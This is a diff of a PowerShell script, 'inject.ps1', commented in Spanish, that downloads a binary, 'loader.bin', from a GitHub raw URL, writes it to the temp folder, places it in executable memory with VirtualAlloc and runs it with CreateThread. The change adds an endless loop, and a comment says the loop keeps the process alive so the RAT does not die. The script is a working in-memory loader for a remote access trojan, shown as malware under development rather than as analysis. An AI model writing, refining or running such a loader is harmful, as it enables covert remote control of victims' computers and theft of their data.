@@ -1,4 +1,4 @@
-# inject.ps1 - Descarga loader.bin e inyecta en memoria (corregido)
+# inject.ps1 - Descarga loader.bin e inyecta en memoria (con bucle de espera)
 $ErrorActionPreference = 'Stop'
 $binUrl = 'https://github.com/DECODERkING/code/raw/main/loader.bin'
 $binPath = "$env:TEMP\loader.bin"
@@ -18,4 +18,11 @@ $addr  = $k32::VirtualAlloc([IntPtr]::Zero, $size, 0x1000 -bor 0x2000, 0x40)
 [Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
 
 $th = $k32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-$k32::WaitForSingleObject($th, [UInt32]::MaxValue) | Out-Null
+
+# Damos tiempo al hilo para que inicialice
+Start-Sleep -Seconds 5
+
+# Mantenemos vivo el proceso de PowerShell para que el RAT no muera
+while ($true) {
+    Start-Sleep -Seconds 60
+}
